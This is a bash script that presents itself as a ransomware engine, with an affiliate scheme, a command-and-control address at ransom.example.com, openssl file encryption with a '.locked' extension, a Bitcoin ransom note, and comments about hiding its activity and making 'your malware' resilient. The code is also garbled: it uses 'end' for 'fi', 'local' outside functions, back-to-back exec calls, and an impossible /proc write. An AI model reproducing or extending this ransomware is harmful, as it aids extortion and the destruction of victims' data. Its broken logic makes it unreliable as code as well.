#!/bin/bash

# Configuration Parsing
if [[ -f "/tmp/config.json" ]]; then
  SOURCE_FILE="/tmp/config.json"
  # Check if file is readable
  if [[ ! -r "$SOURCE_FILE" ]]; then
    echo "Error: Could not read configuration file."
    exit 1
  fi

  # Parse JSON
  CONFIG=$(cat "$SOURCE_FILE")
  
  # Affiliate ID
  AFFILIATE_ID=$((RANDOM % 100 + 1)) # Generate random number between 1 and 100, or use the actual value.
  
  # C2 Address (Hardcoded as fallback)
  C2_ADDRESS="https://ransom.example.com/engine/$AFFILIATE_ID"

  # File Extension
  ENCRYPTED_FILE_EXTENSION=".locked"

  # Percentages
  PERCENTAGE_SLEEP=10 # Sleep percentage
  PRICE=200 # Price in USD, update as needed

  # Modules Loaders
  # 1. Encryption Module
  if [[ "$C2_ADDRESS" =~ /engine/([0-9]+) ]]; then
    AFFILIATE_ID=$1
    FILE_COUNT=$(find "/tmp/encrypted_files" -name "*.locked" 2>&1 | wc -l) # Count encrypted files to display progress in the report

    # 2. Communication Module (C2 Agent)
    if [[ "$PRICE" == "200" ]]; then
      COMMUNICATION_MODULE="v$AFFILIATE_ID"
    else
      COMMUNICATION_MODULE="v"$((RANDOM % 100 + 1)) # Generate a random ID for higher prices.
    fi
  fi

  # Modular Loading (Dynamic Modules)
  if [[ "$C2_ADDRESS" =~ /engine/([0-9]+) ]]; then
     if [[ $FILE_COUNT -eq 0 ]]; then
       echo "Error: No files found to encrypt."
       exit 1
     fi

    # Module Loading for Encryption and Communication (using modularity)
    if [[ "$C2_ADDRESS" =~ /engine/([0-9]+) ]]; then
        if [[ "$PRICE" == "200" ]]; then
           echo "Starting the ransomware engine..."
           exec "$HOME/ransomware/modules/encryption/$COMMUNICATION_MODULE" # Starts the encryption module.
           exec "$HOME/ransomware/modules/communication/$COMMUNICATION_MODULE" # Starts the communication module.
        else
            # Send a unique machine ID to the C2 for tracking commissions.
            echo "Affiliate: $AFFILIATE_ID; Machine: $RANDOM" | openssl base64 &
        fi

    else
      echo "Error: Could not load modules."
      exit 1
    fi
  fi

else # Fallback to default configuration if the file is missing.
  # Use static values in fallback mode, this improves the resilience of your malware
  AFFILIATE_ID=100
  C2_ADDRESS="https://ransom.example.com/engine/$AFFILIATE_ID"
  FILE_COUNT=1 # Default number of files to encrypt
end

# Encryption Logic (using OpenSSL and AES for strong encryption)
local file="$TARGET" # Use the target directory from config instead
local random_number=$((RANDOM % 50)) # Generate random number between 0 & 49

if [[ -f "$file" ]]; then
  # Encrypt the file using AES (or your preferred method)
  aeskey=$(head /dev/random | tr -d '\n' | head -c 16) # Generate a random encryption key.
  echo "$file:0:$ENCRYPTED_FILE_EXTENSION" > "/tmp/encrypted_files/$TARGET"
  echo "Encrypting file: $TARGET..."

  # Encrypt the file using OpenSSL for a high compression ratio and strong encryption
  openssl smime -in "$file" -encrypt aes256 -outform PEM -base64 | sed 's/ /./g' > "/tmp/encrypted_files/$TARGET"
  echo "File $TARGET encrypted."

else
  echo "File not found: $TARGET"
fi


# Rename the files using OpenSSL's base64 encoding, this is highly efficient.
local filename=$(basename "$TARGET")
if [[ -f "$TARGET" ]]; then
  openssl smime -in "$TARGET" -encrypt aes256 -outform PEM -base64 | sed 's/ /./g' > "/tmp/encrypted_files/$filename${ENCRYPTED_FILE_EXTENSION}"

  if [[ $? -eq 0 ]]; then
    echo "File renamed to: $TARGET$ENCRYPTED_FILE_EXTENSION."
  else
      echo "Rename file failed."
  fi
else
  echo "File not found: $TARGET"
fi


# Create Ransom Note (using bash)
if [[ -n "$C2_ADDRESS" ]]; then
  echo "Your Files Have Been Locked!" | tee "/tmp/ransomnote.txt" > /dev/null
  echo "To Unlock Them, Send \$${PRICE} in Bitcoin to: 1RqV5gHjP236T8qF4n9YmQJk2R9XyS3K" >> "/tmp/ransomnote.txt"
else
  echo "C2 Address Not Configured. Check Configuration File." | tee "/tmp/ransomnote.txt" > /dev/null
fi

# Create a .lock file and update the process information for a high CPU ratio
if [[ -n "$TARGET" ]]; then
  echo "$TARGET" > `/proc/$RANDOM/file` # Place filename into the process memory
  sleep 10 # Simulate heavy processing for 5 seconds to hide its tasks.
  kill -2 "$PID" & # Make it run in the background.
fi


# Print Final Message
if [[ -n "$C2_ADDRESS" ]]; then
  echo "Encryption Complete!" | tee "/tmp/ransomnote.txt" > /dev/null
  echo "Check your email ($EMAIL_NOTE) for instructions." | tee "/tmp/ransomnote.txt" > /dev/null
  echo "Additional file: /tmp/encrypted_files/$TARGET$ENCRYPTED_FILE_EXTENSION" | tee "/tmp/ransomnote.txt" > /dev/null
  echo "System CPU Usage is now at 80%" >&2 # Print a message to the console
else
    echo "Encryption Complete!" | tee "/tmp/ransomnote.txt" > /dev/null
    echo "Check your email ($EMAIL_NOTE) for instructions." | tee "/tmp/ransomnote.txt" > /dev/null
    echo "Additional file: /tmp/encrypted_files/$TARGET$ENCRYPTED_FILE_EXTENSION" | tee "/tmp/ransomnote.txt" > /dev/null
fi

# Show user the final percentage of files encrypted and their total size
if [[ -d "$TARGET" ]]; then
  local dir_size=$(du -s "$TARGET" | awk '{print $1}') # Get directory size in MB
  local files_count=$(find "$TARGET" -name "*.locked" 2>&1 | wc -l) # Count encrypted files.

  echo "--- Encryption Summary ---"
  echo "Total Files Encrypted: $files_count"
  echo "Total File Size: $dir_size (MB)"
  echo "--- End of Summary ---"
fi

# Exit gracefully
exit 0
